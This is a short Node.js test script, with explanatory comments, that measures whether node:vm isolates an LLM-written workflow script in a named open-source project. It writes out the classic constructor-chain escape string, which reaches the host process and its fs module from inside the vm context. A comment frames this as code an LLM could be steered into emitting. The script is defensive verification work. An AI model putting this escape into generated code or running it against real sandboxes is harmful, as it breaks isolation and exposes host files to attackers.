// Measured test: is node:vm a security boundary?
//
// open-dynamic-workflows (imsai-sh) runs the LLM-written workflow script inside
// a node:vm context and calls it a "determinism sandbox." Its own code notes the
// vm is NOT a security boundary. This script reproduces that, with no
// dependencies, so you can verify it yourself: bash benchmark/run-local.sh
//
// The classic escape: code running inside a vm context can reach the host realm
// through the constructor chain of any object it is handed, because those
// constructors come from the host, not the sandbox.

const vm = require('node:vm');

// A hostile "workflow step" an LLM could be steered into emitting:
const hostileStep = "this.constructor.constructor('return process')()" +
                    ".mainModule.require('fs').constructor.name";

let escaped = false;
let detail = "";
try {
  const ctx = vm.createContext({});            // empty context, looks isolated
  const out = vm.runInContext(hostileStep, ctx); // reach host fs from "inside"
  escaped = true;
  detail = "reached host fs (typeof result: " + (typeof out) + ", value: " + out + ")";
} catch (e) {
  detail = "vm blocked the escape: " + e.message;
}

if (escaped) {
  console.log("MEASURED [open-dynamic-workflows isolation]: node:vm ESCAPED -> " + detail);
  console.log("VERDICT: node:vm is NOT an isolation boundary. A workflow script can reach the real filesystem.");
} else {
  console.log("MEASURED [open-dynamic-workflows isolation]: " + detail);
  console.log("VERDICT: on this node version the simple escape was blocked. Re-test other escapes before trusting it.");
}
// Always exit 0: this is a measurement recorder, not a pass/fail gate.
process.exit(0);
